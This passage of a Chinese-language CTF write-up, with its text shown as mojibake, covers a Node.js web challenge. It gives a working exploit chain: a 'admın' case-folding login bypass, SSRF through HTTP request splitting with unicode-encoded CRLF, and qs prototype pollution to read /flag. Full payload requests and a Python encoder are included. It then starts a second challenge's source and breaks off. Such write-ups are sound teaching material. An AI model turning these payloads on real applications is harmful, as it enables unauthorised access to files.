&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">isAdmin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,{&lt;/span>
&lt;span style="color:#75af00">list&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">isAdmin&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">isAdmin&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Privilege&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Staff&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;ADMIN&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Privilege&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Monitor&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">isAdmin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;tmp/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mkdirSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,{&lt;/span>
&lt;span style="color:#75af00">list&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">isAdmin&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">isAdmin&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">keys&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;hpdoger&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">paths&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#75715e">//depend on remote server,not real
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">views&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./views&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">extension&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;ejs&amp;#39;&lt;/span>
&lt;span style="color:#111">}))&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./static&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./tmp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bodyParser&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">CONFIG&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#111">()).&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">allowedMethods&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[demo] start-quick is starting at port 3000&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å””ï¼Œçœ‹èµ·æ¥è¦æ¯”å…¶å®ƒçš„å¤æ‚ä¸å°‘ï¼Œä½†æ˜¯æ ¸å¿ƒæ¼æ´žç‚¹æ˜¯ä¸€æ ·çš„ï¼›ç®€å•å®¡ä¸€ä¸‹ä»£ç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206230457270.png" alt="image-20211206230457270">&lt;/p>
&lt;p>åªå…è®¸adminç”¨æˆ·æ‰å¯ä»¥åŠ è½½å…¶å®ƒçš„æ¨¡æ¿&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206230620584.png" alt="image-20211206230620584">&lt;/p>
&lt;p>ç¡®å®žæ˜¯&lt;code>toUpperCase()&lt;/code>çš„é—®é¢˜ï¼Œå¾ˆè½»æ¾å°±ç”¨&lt;code>admÄ±n&lt;/code>ç»•è¿‡äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206231746702.png" alt="image-20211206231746702">&lt;/p>
&lt;p>/requestè·¯ç”±ä¸‹çš„è¯·æ±‚ç»è¿‡&lt;code>CheckUrl&lt;/code>çš„æ£€æŸ¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206231939254.png" alt="image-20211206231939254">&lt;/p>
&lt;p>å¿…é¡»å¼€å¤´æ˜¯http://127.0.0.1:3000/queryï¼Œæ²¡æ³•ç»•è¿‡ï¼Œéœ€è¦SSRFï¼›è¯·æ±‚ä¹‹åŽä¼šè¢«è®°å½•åœ¨sandboxçš„results.txté‡Œé¢ï¼ˆè¿½åŠ çš„å½¢å¼ï¼‰ï¼Œsandboxæ ¹æ®ipå»ºç«‹&lt;/p>
&lt;p>è€Œæ°å¥½/queryæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªè·¯ç”±&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206232301967.png" alt="image-20211206232301967">&lt;/p>
&lt;p>å¹¶ä¸”å‚æ•°paramæ¯”è¾ƒå¥½ç»•è¿‡ï¼Œæˆ‘ä»¬å€ŸåŠ©å®ƒæ¥å®Œæˆæˆ‘ä»¬çš„æ”»å‡»ï¼›æŽ¥ä¸‹æ¥æ‰¾åˆ©ç”¨ç‚¹ï¼Œçœ‹åˆ°/saveè·¯ç”±&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206234720831.png" alt="image-20211206234720831">&lt;/p>
&lt;p>ç®€å•çš„åˆ†æžå†™åœ¨æ³¨é‡Šä¸­äº†ï¼Œ138è¡Œç”¨ssrfç»•è¿‡ï¼Œ146è¡Œä½¿ç”¨çš„qsåº“æœ‰&lt;a href="https://security.snyk.io/vuln/npm:qs:20170213">åŽŸåž‹é“¾æ±¡æŸ“&lt;/a>çš„é—®é¢˜ï¼Œä¼ å‚&lt;code>]=switch&lt;/code>å³å¯ç»•è¿‡ï¼›154è¡Œçš„åˆ¤æ–­ä¹Ÿéœ€è¦ç»•è¿‡ï¼ŒåŽŸåž‹é“¾æ±¡æŸ“sandboxä¸‹çš„ä¸€ä¸ªæ–‡ä»¶ä¸º&lt;code>/flag&lt;/code>ï¼Œå†åŽ»è‡ªå®šä¹‰è¯»åˆ°spathä¸­&lt;/p>
&lt;pre tabindex="0">&lt;code>tmp['__proto__']['opath'] = '/flag';
=&amp;gt;
paths.opath = /flag
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#960050;background-color:#1e0010">amiz HTTP/1.1
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">Host: 127.0.0.1:3000
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">Connection: keep-alive
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">GET /save?]=switch&amp;amp;sandbox=__proto__&amp;amp;opath=/flag&amp;amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&amp;amp;sandbox=__proto__&amp;amp;opath=/flag&amp;amp;spath=tmp/c74e4def8b621891bc34c84bca9b2a76
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207020732089.png" alt="image-20211207020732089">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207001654270.png" alt="image-20211207001654270">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207002041861.png" alt="image-20211207002041861">&lt;/p>
&lt;p>å½“ç„¶ï¼Œç”¨å®Œå…¨unicodeç¼–ç ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œäº²æµ‹è¿™ä¸ªå…¨ç¼–ç å®¹é”™çŽ‡ä¼šé«˜ä¸€ä¸¢ä¸¢&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;span style="color:#111">_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;amiz HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">Host: 127.0.0.1:3000
&lt;/span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">GET /save?]=switch&amp;amp;sandbox=__proto__&amp;amp;opath=/flag&amp;amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0xff&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">))[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nullcon-hackim2020split-second">[nullcon HackIM2020]Split second&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">//node 8.12.0
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pug&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/index.html&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/source.html&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/getMeme&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;iframe src=&amp;#34;https://giphy.com/embed/LLHkw7UnvY3Kw&amp;#34; width=&amp;#34;480&amp;#34; height=&amp;#34;480&amp;#34; frameBorder=&amp;#34;0&amp;#34; class=&amp;#34;giphy-embed&amp;#34; allowFullScreen&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;https://giphy.com/gifs/kid-dances-jumbotron-LLHkw7UnvY3Kw&amp;#34;&amp;gt;via GIPHY&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">authheader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;adminauth&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">pug2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">decodeURI&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pug&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
